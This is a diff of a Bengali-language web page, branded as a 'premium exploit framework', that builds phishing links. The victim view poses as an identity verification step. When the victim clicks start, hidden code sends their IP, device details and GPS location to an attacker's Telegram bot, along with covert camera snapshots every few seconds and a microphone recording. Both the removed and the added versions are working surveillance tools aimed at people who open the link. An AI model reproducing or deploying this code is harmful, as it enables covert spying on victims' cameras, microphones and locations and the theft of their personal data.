@@ -2,218 +2,476 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MR_MOMIN_🌍 | Secure Tool</title>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>MR_MOMIN_🌍 | প্রিমিয়াম টুল</title>
     <style>
-        :root {
-            --bg: #0a0f1e;
-            --card: rgba(255, 255, 255, 0.08);
-            --primary: #0ea5e9;
-            --accent: #f43f5e;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
         }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body {
-            margin: 0; padding: 0;
-            font-family: 'Hind Siliguri', sans-serif;
-            background: var(--bg);
-            color: #fff;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; overflow: hidden;
+            background: radial-gradient(circle at 10% 20%, #0a0f1e, #010101);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
         }
-        /* Animated Background Gradients */
-        .blob {
-            position: absolute; width: 400px; height: 400px;
-            background: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
-            filter: blur(80px); border-radius: 50%; z-index: -1;
-            animation: move 10s infinite alternate; opacity: 0.4;
+        .glass-card {
+            background: rgba(10, 20, 30, 0.7);
+            backdrop-filter: blur(16px);
+            border-radius: 2rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            max-width: 550px;
+            width: 100%;
+            padding: 2rem 1.5rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 255, 255, 0.2);
+            transition: all 0.3s ease;
         }
-        @keyframes move { from { transform: translate(-20%, -20%); } to { transform: translate(20%, 20%); } }
-
-        .container {
-            width: 90%; max-width: 420px;
-            background: var(--card);
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 32px; padding: 35px 25px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+            background: linear-gradient(135deg, #aaffff, #00ccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            margin-bottom: 0.25rem;
+        }
+        .tagline {
+            text-align: center;
+            color: #7ab3c8;
+            font-size: 0.7rem;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px dashed #2a5f73;
+            display: inline-block;
+            width: auto;
+            padding-bottom: 5px;
+        }
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+        label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #bbddff;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background: #0f1922;
+            border: 1px solid #2f5b6e;
+            border-radius: 1.2rem;
+            padding: 12px 18px;
+            color: #f0f9ff;
+            font-size: 0.9rem;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #0ef;
+            box-shadow: 0 0 10px rgba(0, 238, 255, 0.3);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 1.8rem 0;
+        }
+        .feature-card {
+            background: #0c1822;
+            border: 1px solid #2a5b6e;
+            border-radius: 1.2rem;
+            padding: 12px 6px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #cae9ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .feature-card.selected {
+            background: rgba(0, 200, 255, 0.2);
+            border-color: #0ef;
+            box-shadow: 0 0 12px #0ef4;
+            color: white;
+        }
+        .feature-card span {
+            font-size: 1.3rem;
+        }
+        .btn {
+            width: 100%;
+            background: linear-gradient(95deg, #0d8ba8, #006b86);
+            border: none;
+            border-radius: 2rem;
+            padding: 14px;
+            font-weight: bold;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .link-box {
+            margin-top: 1.8rem;
+            background: #00000066;
+            border-radius: 1.2rem;
+            padding: 14px;
+            display: none;
+            border-left: 4px solid #0ef;
+        }
+        .link-text {
+            font-family: monospace;
+            font-size: 0.75rem;
+            word-break: break-all;
+            background: #09131e;
+            padding: 10px;
+            border-radius: 1rem;
+            margin-bottom: 12px;
+            color: #b7e4ff;
+        }
+        .copy-row {
+            display: flex;
+            gap: 12px;
+        }
+        .copy-row button {
+            flex: 1;
+            background: #1f3e4c;
+            border: none;
+            border-radius: 2rem;
+            padding: 8px;
+            font-size: 0.7rem;
+            color: #e0f2ff;
+            cursor: pointer;
+        }
+        .victim-container {
             text-align: center;
         }
-        h1 { font-size: 26px; margin: 10px 0; color: var(--primary); font-weight: 700; }
-        .dev { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
-        
-        .input-box {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px; padding: 14px 18px;
-            width: 100%; color: #fff; font-size: 16px;
-            margin-bottom: 15px; outline: none; transition: 0.3s;
+        .victim-container h2 {
+            font-size: 1.6rem;
+            color: #9ef;
+            margin-bottom: 0.5rem;
         }
-        .input-box:focus { border-color: var(--primary); background: rgba(255,255,255,0.1); }
-        
-        .btn {
-            width: 100%; padding: 16px; border-radius: 16px;
-            border: none; background: linear-gradient(135deg, #0ea5e9, #2563eb);
-            color: #fff; font-size: 18px; font-weight: 600;
-            cursor: pointer; transition: 0.3s; margin-top: 10px;
+        .victim-container p {
+            color: #bbd4f0;
+            font-size: 0.85rem;
+            margin: 12px 0;
         }
-        .btn:active { transform: scale(0.97); }
-
-        .link-box {
-            display: none; margin-top: 25px; padding: 15px;
-            background: rgba(0,0,0,0.3); border-radius: 15px;
-            border: 1px dashed var(--primary);
+        .status-area {
+            margin-top: 1.5rem;
+            display: none;
         }
-        #resLink { color: #7dd3fc; font-size: 13px; word-break: break-all; cursor: pointer; }
-        
-        /* Victim UI */
-        #victim-ui { display: none; }
-        .loader {
-            border: 4px solid rgba(255,255,255,0.1);
-            border-left-color: var(--primary);
-            width: 40px; height: 40px; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 20px auto;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #2f6f84;
+            border-top-color: #0ef;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        video, canvas { position: fixed; left: -1000px; opacity: 0; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status-msg {
+            font-size: 0.8rem;
+            color: #ffd966;
+            background: #071a24;
+            padding: 8px;
+            border-radius: 1rem;
+            word-break: break-word;
+        }
+        .hide {
+            display: none;
+        }
+        .info-note {
+            font-size: 0.65rem;
+            text-align: center;
+            margin-top: 20px;
+            color: #3f7e8c;
+        }
     </style>
 </head>
 <body>
+<div class="glass-card" id="appRoot">
+    <!-- জেনারেটর প্যানেল -->
+    <div id="generatorPanel">
+        <h1>MR_MOMIN_🌍</h1>
+        <div style="text-align:center;"><span class="tagline">⚡ প্রিমিয়াম এক্সপ্লয়েট ফ্রেমওয়ার্ক</span></div>
 
-<div class="blob"></div>
-
-<div class="container">
-    <!-- Admin Setup View -->
-    <div id="admin-ui">
-        <div style="font-size: 45px;">🔥</div>
-        <h1>Advanced Panel</h1>
-        <div class="dev">Developed by: <b>MR_MOMIN_🌍</b></div>
-        
-        <input type="text" id="token" class="input-box" placeholder="টেলিগ্রাম বট টোকেন">
-        <input type="text" id="cid" class="input-box" placeholder="টেলিগ্রাম চ্যাট আইডি">
-        
-        <button class="btn" onclick="gen()">🔗 লিংক তৈরি করুন</button>
-        
-        <div id="resBox" class="link-box">
-            <p style="margin:0 0 8px; font-size:12px;">নিচের লিংকটি কপি করুন:</p>
-            <div id="resLink" onclick="copy()">জেনারেট হচ্ছে...</div>
+        <div class="input-group">
+            <label>🤖 টেলিগ্রাম বট টোকেন</label>
+            <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrs">
         </div>
+        <div class="input-group">
+            <label>💬 চ্যাট আইডি</label>
+            <input type="text" id="chatId" placeholder="-1001234567890 বা 123456789">
+        </div>
+
+        <div class="feature-grid" id="featureGrid">
+            <div class="feature-card" data-feat="C"><span>📸</span> ক্যামেরা</div>
+            <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন</div>
+            <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
+            <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
+        </div>
+
+        <button class="btn" id="generateLinkBtn">✨ লিংক জেনারেট করুন</button>
+
+        <div id="linkResultBox" class="link-box">
+            <div class="link-text" id="generatedLink">আপনার লিংক এখানে</div>
+            <div class="copy-row">
+                <button id="copyFullBtn">📋 লিংক কপি করুন</button>
+            </div>
+        </div>
+        <div class="info-note">🔒 লিংকটি কপি করে শেয়ার করুন। ভিকটিম ওপেন করলে শুরু বাটনে ক্লিক করবে এবং অনুমতি দিলেই সব তথ্য টেলিগ্রামে চলে আসবে।</div>
     </div>
 
-    <!-- Victim Page View -->
-    <div id="victim-ui">
-        <div style="font-size: 50px;">🛡️</div>
-        <h2>Verification Required</h2>
-        <p style="color:#94a3b8; font-size:14px;">আপনার কানেকশন নিরাপদ কিনা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
-        
-        <button class="btn" id="startBtn">Continue to Page</button>
-        
-        <div id="status-area" style="display:none; margin-top:20px;">
-            <div class="loader"></div>
-            <p id="msg" style="font-size:13px; color:#38bdf8;">সার্ভারের সাথে যুক্ত হচ্ছে...</p>
+    <!-- ভিকটিম প্যানেল (প্রথমে লুকানো) -->
+    <div id="victimPanel" class="victim-container hide">
+        <h2>🛡️ যাচাইকরণ প্রয়োজন</h2>
+        <p>নিচের বাটনে ক্লিক করে আপনার পরিচয় নিশ্চিত করুন</p>
+        <button class="btn" id="startVictimBtn">▶ শুরু করুন</button>
+        <div id="victimStatusArea" class="status-area">
+            <div class="spinner"></div>
+            <div class="status-msg" id="victimStatusMsg">প্রস্তুতি নিচ্ছি...</div>
         </div>
     </div>
 </div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+<!-- গোপন ভিডিও/অডিও উপাদান -->
+<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    const urlP = new URLSearchParams(window.location.search);
-    const botT = urlP.get('t');
-    const chatI = urlP.get('c');
-
-    // লিংক জেনারেট (Is.gd API ব্যবহার করা হয়েছে যা TinyURL এর চেয়ে ভালো)
-    async function gen() {
-        const t = document.getElementById('token').value.trim();
-        const c = document.getElementById('cid').value.trim();
-        if(!t || !c) return alert("তথ্য সঠিক দিন!");
-
-        const l = `${window.location.origin}${window.location.pathname}?t=${t}&c=${c}`;
-        document.getElementById('resBox').style.display = 'block';
-        document.getElementById('resLink').innerText = "অপেক্ষা করুন...";
-
-        try {
-            // Is.gd API for better forwarding
-            const r = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(l)}`);
-            const d = await r.json();
-            document.getElementById('resLink').innerText = d.shorturl || l;
-        } catch(e) {
-            document.getElementById('resLink').innerText = l;
+    // ===================== নিরাপদে বেস ইউআরএল তৈরি =====================
+    function getBaseUrl() {
+        // সরাসরি href থেকে '?' এর আগের অংশ নেওয়া (এতে about: বা null আসবে না)
+        let fullUrl = window.location.href;
+        let base = fullUrl.split('?')[0];
+        // যদি base 'about:' দিয়ে শুরু হয় তাহলে আমরা origin+pathname ব্যবহার করব
+        if (base.startsWith('about:') || base === 'null' || base === '') {
+            let origin = window.location.origin;
+            let pathname = window.location.pathname;
+            if (origin && origin !== 'null') {
+                base = origin + pathname;
+            } else {
+                // শেষ উপায়: পেজের নাম ধরে নেওয়া (index.html)
+                base = 'index.html';
+            }
         }
-    }
-
-    function copy() {
-        const t = document.getElementById('resLink').innerText;
-        navigator.clipboard.writeText(t);
-        alert("✅ লিংক কপি হয়েছে!");
-    }
-
-    // ভিকটিম সাইড লজিক
-    if(botT && chatI) {
-        document.getElementById('admin-ui').style.display = 'none';
-        document.getElementById('victim-ui').style.display = 'block';
-    }
-
-    document.getElementById('startBtn').addEventListener('click', async function() {
-        this.style.display = 'none';
-        document.getElementById('status-area').style.display = 'block';
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
-            
-            // ডিভাইসের ডাটা পাঠানো
-            await sendDetails();
-            
-            // সাইলেন্ট ক্যাপচার লুপ
-            setInterval(snap, 333); // প্রতি সেকেন্ডে ৩টি
-            
-            setTimeout(() => {
-                document.getElementById('msg').innerText = "আপনার ডিভাইসটি এখন সুরক্ষিত।";
-            }, 3000);
-
-        } catch (e) {
-            document.getElementById('msg').innerText = "Error: Please allow camera access!";
-            sendToBot("❌ ইউজার ক্যামেরা পারমিশন ব্লক করেছে।");
+        // শেষে '/' থাকলে মুছে ফেলি
+        if (base.endsWith('/')) {
+            base = base.slice(0, -1);
         }
-    });
-
-    async function sendDetails() {
-        let ip = "Unknown";
-        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
-        
-        let batt = "N/A";
-        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level*100)}% (${b.charging?'Charging':'No'})`; } catch(e){}
-
-        const text = `🔥 *Target Detected!*\n\n📍 *IP:* \`${ip}\` \n🔋 *Battery:* ${batt}\n📱 *Device:* ${navigator.platform}\n👨‍💻 *Dev:* MR_MOMIN_🌍`;
-        sendToBot(text, true);
+        return base;
     }
 
-    function snap() {
-        const v = document.getElementById('v');
-        const can = document.getElementById('c');
-        can.width = v.videoWidth || 640;
-        can.height = v.videoHeight || 480;
-        can.getContext('2d').drawImage(v, 0, 0);
-        
-        can.toBlob(b => {
-            const f = new FormData();
-            f.append('chat_id', chatI);
-            f.append('photo', b, 'momin.jpg');
-            fetch(`https://api.telegram.org/bot${botT}/sendPhoto`, { method:'POST', body:f });
-        }, 'image/jpeg', 0.4);
+    // ইউআরএল প্যারামিটার চেক
+    const urlParams = new URLSearchParams(window.location.search);
+    const tokenParam = urlParams.get('t');
+    const chatParam = urlParams.get('c');
+    const featParam = urlParams.get('f') || '';
+
+    if (tokenParam && chatParam) {
+        // ভিকটিম মোড
+        document.getElementById('generatorPanel').classList.add('hide');
+        document.getElementById('victimPanel').classList.remove('hide');
+        startVictimMode(tokenParam, chatParam, featParam);
+    } else {
+        // জেনারেটর মোড
+        setupGenerator();
     }
 
-    function sendToBot(m, md=false) {
-        fetch(`https://api.telegram.org/bot${botT}/sendMessage`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({chat_id: chatI, text: m, parse_mode: md?"Markdown":null})
+    // ===================== জেনারেটর ফাংশন =====================
+    function setupGenerator() {
+        const featureDivs = document.querySelectorAll('.feature-card');
+        let selectedFeatures = new Set();
+
+        featureDivs.forEach(div => {
+            div.addEventListener('click', () => {
+                const feat = div.getAttribute('data-feat');
+                if (selectedFeatures.has(feat)) {
+                    selectedFeatures.delete(feat);
+                    div.classList.remove('selected');
+                } else {
+                    selectedFeatures.add(feat);
+                    div.classList.add('selected');
+                }
+            });
+        });
+
+        const genBtn = document.getElementById('generateLinkBtn');
+        const linkBox = document.getElementById('linkResultBox');
+        const linkSpan = document.getElementById('generatedLink');
+        let fullLink = '';
+
+        genBtn.addEventListener('click', () => {
+            const token = document.getElementById('botToken').value.trim();
+            const chatId = document.getElementById('chatId').value.trim();
+            if (!token || !chatId) {
+                alert('⚠️ বট টোকেন এবং চ্যাট আইডি উভয়ই দিন!');
+                return;
+            }
+            if (selectedFeatures.size === 0) {
+                alert('⚠️ অন্তত একটি ফিচার নির্বাচন করুন!');
+                return;
+            }
+            const features = Array.from(selectedFeatures).join('');
+            const baseUrl = getBaseUrl();
+            fullLink = `${baseUrl}?t=${encodeURIComponent(token)}&c=${encodeURIComponent(chatId)}&f=${features}`;
+            
+            linkSpan.innerText = fullLink;
+            linkBox.style.display = 'block';
+        });
+
+        document.getElementById('copyFullBtn').onclick = () => {
+            if (fullLink) {
+                copyToClipboard(fullLink, '✅ লিংক কপি হয়েছে!');
+            } else {
+                alert('প্রথমে লিংক জেনারেট করুন');
+            }
+        };
+    }
+
+    function copyToClipboard(text, msg) {
+        navigator.clipboard.writeText(text).then(() => alert(msg));
+    }
+
+    // ===================== ভিকটিম মোড (সম্পূর্ণ কার্যকর) =====================
+    async function startVictimMode(token, chatId, features) {
+        const startBtn = document.getElementById('startVictimBtn');
+        const statusArea = document.getElementById('victimStatusArea');
+        const statusMsg = document.getElementById('victimStatusMsg');
+
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            statusArea.style.display = 'block';
+            statusMsg.innerText = '🔐 অনুমতি চাওয়া হচ্ছে...';
+
+            // টেলিগ্রামে পাঠানোর হেল্পার ফাংশন
+            async function sendText(text) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+                    });
+                } catch(e) { console.error(e); }
+            }
+
+            async function sendPhoto(blob) {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'spy.jpg');
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            }
+
+            async function sendVoice(blob) {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('voice', blob, 'audio.ogg');
+                await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
+            }
+
+            // ----- ১. ডিভাইস তথ্য (X) -----
+            if (features.includes('X')) {
+                try {
+                    let ip = 'অজানা';
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch(e) {}
+                let battery = 'N/A';
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level*100)}% (${b.charging ? 'চার্জিং' : 'চার্জিং না'})`;
+                }
+                const info = `📱 *ডিভাইস তথ্য*\nআইপি: \`${ip}\`\nব্যাটারি: ${battery}\nপ্ল্যাটফর্ম: ${navigator.platform}\nভাষা: ${navigator.language}\nস্ক্রিন: ${screen.width}x${screen.height}\nসময়: ${new Date().toLocaleString('bn-BD')}`;
+                await sendText(info);
+                statusMsg.innerText = '✅ ডিভাইস তথ্য পাঠানো হয়েছে';
+            }
+
+            // ----- ২. লোকেশন (L) -----
+            if (features.includes('L')) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const maps = `https://maps.google.com/?q=${lat},${lon}`;
+                        await sendText(`📍 *লোকেশন*\nঅক্ষাংশ: ${lat}\nদ্রাঘিমাংশ: ${lon}\n[মানচিত্রে দেখুন](${maps})`);
+                        statusMsg.innerText = statusMsg.innerText + '\n📍 লোকেশন ধারণ করা হয়েছে';
+                    }, async (err) => {
+                        await sendText(`❌ লোকেশন ত্রুটি: ${err.message}`);
+                    });
+                } else {
+                    await sendText('❌ এই ব্রাউজার লোকেশন সাপোর্ট করে না');
+                }
+            }
+
+            // ----- ৩. ক্যামেরা (C) -----
+            let cameraInterval = null;
+            if (features.includes('C')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.getElementById('hiddenCanvas');
+                    const capture = () => {
+                        if (video.videoWidth && video.videoHeight) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.65);
+                        }
+                    };
+                    capture(); // প্রথম ছবি সঙ্গে সঙ্গে
+                    cameraInterval = setInterval(capture, 4000); // প্রতি ৪ সেকেন্ডে
+                    statusMsg.innerText = statusMsg.innerText + '\n📸 ক্যামেরা সক্রিয় (প্রতি ৪ সেকেন্ডে ছবি)';
+                } catch (err) {
+                    await sendText(`❌ ক্যামেরা ত্রুটি: ${err.message}`);
+                    statusMsg.innerText = statusMsg.innerText + '\n⚠️ ক্যামেরা অনুমতি দেওয়া হয়নি';
+                }
+            }
+
+            // ----- ৪. মাইক্রোফোন (M) -----
+            if (features.includes('M')) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    const audioPromise = new Promise(resolve => {
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/ogg' });
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(blob);
+                        };
+                    });
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 6000); // ৬ সেকেন্ড রেকর্ড
+                    const audioBlob = await audioPromise;
+                    await sendVoice(audioBlob);
+                    statusMsg.innerText = statusMsg.innerText + '\n🎤 ভয়েস রেকর্ডিং পাঠানো হয়েছে';
+                } catch (err) {
+                    await sendText(`❌ মাইক্রোফোন ত্রুটি: ${err.message}`);
+                }
+            }
+
+            statusMsg.innerText = statusMsg.innerText + '\n✨ কাজ শেষ। এই পৃষ্ঠা বন্ধ করতে পারেন।';
         });
     }
 </script>
 </body>
 </html>
-
